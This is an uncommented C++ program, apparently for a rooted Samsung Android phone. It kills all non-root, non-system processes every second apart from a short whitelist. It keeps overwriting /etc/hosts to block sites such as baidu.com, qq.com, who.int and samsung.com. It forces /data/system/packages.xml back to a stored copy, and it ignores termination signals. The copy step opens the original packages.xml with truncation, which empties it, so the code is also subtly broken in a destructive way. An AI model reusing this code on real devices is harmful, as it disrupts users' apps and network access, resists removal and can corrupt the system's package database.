#include <iostream>
#include <signal.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <pwd.h>
#include <pthread.h>
const char procs[]=
    "ps -ef|"
    "grep \\.|"
    "grep -v grep|"
    "grep -v PID|"
    "grep -v com\\.sec\\.android\\.app\\.keyguard|"
    "grep -v com\\.android\\.settings|"
    "grep -v com\\.sec\\.android\\.widgetapp\\.alarmwidget|"
    "grep -v com\\.sec\\.android\\.widgetapp\\.activeapplicationwidget|"
    "grep -v com\\.sec\\.android\\.provider\\.badge|"
    "grep -v com\\.sec\\.factory|"
    "grep -v org\\.simalliance\\.openmobileapi|"
    "grep -v android\\.process\\.acore|"
    "grep -v com\\.android\\.systemui|"
    "grep -v org\\.yrssf\\.netspace|"
    "grep -v com\\.sec\\.android\\.app\\.launcher|"
    "awk '{if($1!=\"root\" && $1!=\"system\"){print $2}}'|"
    "xargs kill >/dev/null 2 & >/dev/null";
void * killproc(void*){
  std::cout << procs << std::endl;
  while(1){
    system(procs);
    //printf("loop");
    sleep(1);
  }
}
void * crackDNS(void*){
  while(1){
    FILE * fd=fopen("/etc/hosts","w");
    if(!fd){
      sleep(20);
      continue;
    }
    fprintf(fd,"127.0.0.1 localhost\n");
    fprintf(fd,"::1 localhost ip6-localhost ip6-loopback\n");
    fprintf(fd,"127.0.0.1 baidu.com\n");
    fprintf(fd,"127.0.0.1 www.baidu.com\n");
    fprintf(fd,"127.0.0.1 sougo.com\n");
    fprintf(fd,"127.0.0.1 www.sougo.com\n");
    fprintf(fd,"127.0.0.1 www.who.int\n");
    fprintf(fd,"127.0.0.1 qq.com\n");
    fprintf(fd,"127.0.0.1 www.renren.com\n");
    fprintf(fd,"127.0.0.1 renren.com\n");
    fprintf(fd,"127.0.0.1 www.samsung.com\n");
    fclose(fd);
    sleep(20);
  }
}
const char pkconffilename[]="/data/system/packages.xml";
bool file_same(const char * fileName1,const char * fileName2){
  FILE *f1,*f2;
  char ch1,ch2;
  if(((f1=fopen(fileName1,"r"))==0) || ((f2=fopen(fileName2,"r"))==0)){
    return 0;  
  }
  do{
    ch1=fgetc(f1);
    ch2=fgetc(f2);
    if(ch1!=ch2){
      return 0;
    }
  }while(ch1!=EOF || ch2!=EOF);
  return 1;
}
void * lockpackageconf(void*){
  int  from,to;
  char buf[1024]={0};
  int  res;
  if(access("data/packages.xml",F_OK)!=0){
    from= open(pkconffilename     ,O_RDWR|O_CREAT|O_TRUNC,0666);
    if(from==-1) return NULL;
    to  = open("data/packages.xml",O_RDWR|O_CREAT|O_TRUNC,0666);
    if(to  ==-1) return NULL;
    while((res =read(from,buf,1024))>0){
      write(to,buf,res);
    }
    close(from);
    close(to);
  }
  while(1){
    if(file_same("data/packages.xml",pkconffilename)){
      sleep(2);
      continue;
    }
    from  = open("data/packages.xml",O_RDWR); if(from==-1){sleep(2);continue;}
    to    = open(pkconffilename     ,O_RDWR); if(to  ==-1){sleep(2);continue;}
    while((res =read(from,buf,1024))>0){
      write(to,buf,res);
    }
    close(to);
    close(from);
    sleep(2);
  }
}
int main(){
  signal(15,[](int){
    return;
  });
  pthread_t newthread;
  if(pthread_create(&newthread,NULL,killproc,NULL)!=0)
        perror("pthread_create");
  if(pthread_create(&newthread,NULL,lockpackageconf,NULL)!=0)
        perror("pthread_create");
  crackDNS(NULL);
}